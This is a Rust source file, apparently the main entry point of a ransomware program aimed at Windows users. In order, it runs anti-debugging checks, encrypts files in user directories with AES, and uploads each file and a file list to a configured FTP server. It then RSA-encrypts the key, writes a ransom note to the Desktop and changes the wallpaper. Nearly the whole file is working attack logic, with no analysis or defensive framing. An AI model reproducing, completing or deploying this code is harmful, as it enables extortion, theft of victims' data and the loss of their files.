mod antireversing;
mod config;
mod cypher;

use base64;
use std::env;

use cypher::walker::walk_and_encrypt_directories;

fn main() {
    // ===================================================================================
    // STEP 1: Anti-Reversing Checks
    // ===================================================================================
    // This module attempts to detect debugging or reverse engineering attempts.
    antireversing::anti_reversing();

    // ===================================================================================
    // STEP 2: AES Key Generation
    // ===================================================================================
    let key: Vec<u8> = cypher::lib::generate_key();

    #[cfg(debug_assertions)]
    {
        println!("==============================");
        println!("Generated AES Key: {:?}", key);
        println!("Key Size: {} bytes", key.len());
        println!("==============================");
    }

    // ===================================================================================
    // STEP 3: Walking Through User Directories and Encrypting Files
    // ===================================================================================
    let user: String = cypher::walker::get_user_name().unwrap();
    let file_tree = walk_and_encrypt_directories(
        user.clone(),
        &config::DIR_NAMES,
        *config::RANSOM_EXT,
        &cypher::config::VALID_EXTENSIONS,
        &key,
    );

    // ===================================================================================
    // STEP 4: File Tree Generation and Data Exfiltration
    // ===================================================================================
    
    let hostname: String = env::var("COMPUTERNAME").unwrap_or(String::from("NOT DEFINED"));
    let exfiltration_base_path: String = format!("{}/", hostname);

    // Preparing an output log for affected files
    let mut output: String = String::new();
    output.push_str("Files affected:\n");
    output.push_str("=========================\n");

    for file in file_tree.files {
        output.push_str(&format!("- {}\n", file));

        #[cfg(debug_assertions)]
        println!("Exfiltrating: {}", file);

        let output_path: String = exfiltration_base_path.clone() + "data/" + file.as_str();
        let _ = cypher::ftp::upload_file(*cypher::config::SERVER_FTP, &output_path, &file);
    }

    // ===================================================================================
    // STEP 5: Writing and Uploading File Tree to Server
    // ===================================================================================
    let desktop_path: String = format!("C:\\Users\\{}\\Desktop", user.clone());
    let file_tree_path: String = format!("{}\\file_tree.txt", desktop_path);
    let _ = std::fs::write(file_tree_path.clone(), output);

    let remote_file_tree: String = exfiltration_base_path.clone() + "file_tree.txt";
    let _ = cypher::ftp::upload_file(*cypher::config::SERVER_FTP, &remote_file_tree, &file_tree_path);

    // ===================================================================================
    // STEP 6: Encrypting AES Key with RSA 
    // ===================================================================================
    let aes_key_enc: Vec<u8> = cypher::lib::encrypt_aes_key(key, cypher::config::PUBLIC_KEY_PEM);
    let encoded_key: String = base64::encode(&aes_key_enc);

    #[cfg(debug_assertions)]
    println!("AES Key (AES+RSA in Base64): {}", encoded_key);

    // ===================================================================================
    // STEP 7: Writing and Uploading Ransom Note, it has the AES+RSA+base64 key
    // ===================================================================================
    cypher::lib::write_ransom_note(&user, encoded_key, cypher::config::RANSOM_NOTE).unwrap();

    let note_path: String = format!("C:\\Users\\{}\\Desktop\\README.txt", user.clone());
    let remote_file_tree: String = exfiltration_base_path + "key";
    let _ = cypher::ftp::upload_file(*cypher::config::SERVER_FTP, &remote_file_tree, &note_path);

    let _ = cypher::lib::change_wallpaper(format!("C:\\Users\\{}",user).as_str());
}
